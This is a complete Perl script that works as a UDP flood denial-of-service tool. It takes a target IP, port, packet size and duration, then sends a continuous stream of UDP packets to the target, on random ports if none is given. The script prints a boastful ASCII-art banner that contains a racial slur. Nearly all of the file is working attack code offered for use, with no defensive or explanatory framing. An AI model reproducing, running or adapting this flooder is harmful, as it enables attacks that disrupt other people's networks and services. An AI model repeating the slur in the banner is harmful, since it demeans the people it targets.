#!/usr/bin/perl
 
##############
# Vampire
##############
 
use Socket;
use strict;
 
if ($#ARGV != 3) {
  print "crimez.pl <ip> <port> <size> <time>\n\n";
  print " port=0: use random ports\n";
  print " size=0: use random size between 64 and 1024\n";
  print " time=0: continuous flood\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
print <<EOTEXT;
11111111111111111111111111111                
11111111111111¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶         
1111111111¶¶¶¶¶111_________________¶¶        
11111111¶¶1_______1111______111_____¶¶       
111111¶¶______11_________11111111____¶1      
111111¶____11___1_____11______1111___1¶      
11111¶1___1_____1_____1_________1_____¶1     
11111¶__________________1¶¶¶¶1________1¶     
1111¶¶_____¶¶¶¶1______1¶¶_¶¶¶¶¶1_______¶¶    
111¶¶_1_1_¶¶¶¶¶¶¶_1___¶__1¶¶¶¶¶¶111____1¶¶   
111¶_1________11¶¶1___¶¶¶1__1_____1¶¶¶1__1¶  
11¶1__1¶¶1______11_____1____¶¶__1¶¶1__¶¶__1¶ 
11¶1__111¶¶¶¶___¶1___________1¶¶1___¶__¶1__¶ 
11¶1____1_11___¶¶_____1¶1_________¶¶¶1__¶__¶1
111¶_1__¶____1¶¶______11¶1_____1¶¶1_¶¶¶1¶__¶1
111¶1__¶¶___11¶¶____¶¶¶_¶___1¶¶¶1___¶__¶___¶1
111¶¶__¶¶¶1_____¶¶1_____11¶¶¶1_¶__1¶¶_____¶11
1111¶__¶¶1¶¶¶1___¶___1¶¶¶¶1____¶¶¶¶¶_____¶¶11
1111¶__¶_1__¶¶¶¶¶¶¶¶¶11__¶__1¶¶¶1_¶_____¶¶111
1111¶1_¶¶¶__1___¶___1____¶¶¶¶¶1¶_¶¶____¶¶1111
1111¶1_¶¶¶¶¶¶¶1¶¶11¶¶1¶¶¶¶¶1___1¶¶_____¶11111
1111¶1_¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1_¶____¶¶_____¶¶11111
1111¶1_¶¶¶¶¶¶¶¶¶¶¶¶1¶1____¶__1¶¶______¶111111
1111¶__1¶¶_¶_¶__¶___11____1¶¶¶______1¶1111111
1111¶___¶¶1¶_11_11__1¶__1¶¶¶1___11_1¶11111111
1111¶_____¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1___11111¶¶111111111
1111¶__________11111_______111_1¶¶11111111111
1111¶_1__11____________1111__1¶¶1111111111111
1111¶__11__1________1111___1¶¶111111111111111
1111¶___1111_____________1¶¶11111111111111111
1111¶¶_______________11¶¶¶1111111111111111111
11111¶¶__________1¶¶¶¶¶1111111111111111111111
1111111¶¶¶¶¶¶¶¶¶¶¶111111111111111111111111111


oViruzzz Creeping On Yuh Modem Nigga 

EOTEXT
print "oViruzzz Flooding $ip " . ($port ? $port : "random") . " port with " .
  ($size ? "$size-byte" : "random size") . " packets" .
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, 
pack("a$psize","saf3e368wumu7repa4uxa2rucHaphubeGamu9R3373af8Us3eTHUgepRAfAS2c6CHAyegURepUbre94wRAwruS2uhU8UXasp7spasw7sw8h7wapr5spabekumu8ast8StRadusASacu6a6e5efrAzeWucH5cumuswaraca7hAbrewrecujetrafefadrawruW4ayAjU37sPUseBr4cRuPhacrUtrf0azrrQlLd1xdSjjtdwXfjyXArkExrVxVlulxssmr0u0lRscLAqjkZB43ajPRmAH4JQ6T1SOZPFmndbEi4IUOIuUmPCXI044f73uGIeJHs8lh36KpJausXqykL2idPx1j120Rra2DI1kmGgde5LI4TJMuQvrotBR3Fli0g1uwt74ALKfRzHYZJR0wkqNncUY178LcbTFtx5n7MF4zX3P4Z3mUVkAebkXqDv6EETKTNBes9kW2QBEBLeKcBH4cUAQ8Y30mdGozVRNJq3wtDMmgtzCibqXEEp3cZATTOMqIDxn3t5HYdspEofPneXpPTUE0TBN8oRAp4DjSlhfDAVmfNgbdSbTHWT7Y7gVi6kgrNXKCM64V4kOGvesVr0SZU3k83r6qAr3w4d26kurU9eBRa53cEtRaQaCHEvacu4PETRaf3yepHAk9FAgU2at8GEMEZAwUjaDesTufu2r3DaPhedR7quCru7reketc8atacAStuGeFruNuTHaWuspabr6drARa4r4cApRewuFRaD3qAXAsPeMAChudRUWxuq73R5dra8epre4tasp8craq677wru5asuq3tradede8rethuSwAfespastuduypUt2fudra5utanewrat83rucruyuje6aphuprUWawrawr4tha922HeSpU8acacu5hastuprecevasteberepagas6ejuje2heswugukerebrajeVeswerajAdagecah3phE9EsutaFrU6erathu2u6utraseCrEjehaChuphEchepeswutrezu86pret6afa"), 
0, pack_sockaddr_in($pport, $iaddr));}
